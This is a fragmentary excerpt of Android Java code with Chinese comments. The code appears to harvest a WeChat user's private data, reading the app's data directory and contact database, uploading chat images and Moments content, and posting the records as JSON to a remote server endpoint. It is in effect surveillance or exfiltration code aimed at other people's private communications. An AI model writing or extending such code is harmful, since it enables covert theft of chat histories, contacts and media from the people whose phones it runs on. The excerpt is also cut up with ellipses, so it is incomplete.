...
//                RLog.d(TAG, "UploadService1-读取/data/user/999/com.tencent.mm/");
            }
            ...
            UploadPicService1.getInstance().openData(wxId);//上传聊天图片
            UploadPicService1.getInstance().openRuning(wxId);//处理朋友圈数据
            RLog.d(TAG,"数据全部处理完成");
                contactDb.close();
        } catch (Exception e) {
            e.printStackTrace();
...
//            uploadVoiceInfo(egCreateTime);
        ...
        final String json = new Gson().toJson(jsonWrap);
        String url = ConfigWechat.insertWeChatRecord;
       // RLog.d(TAG, "uploadRcontactToServer 开始传输数据 Json【" + json + "】");
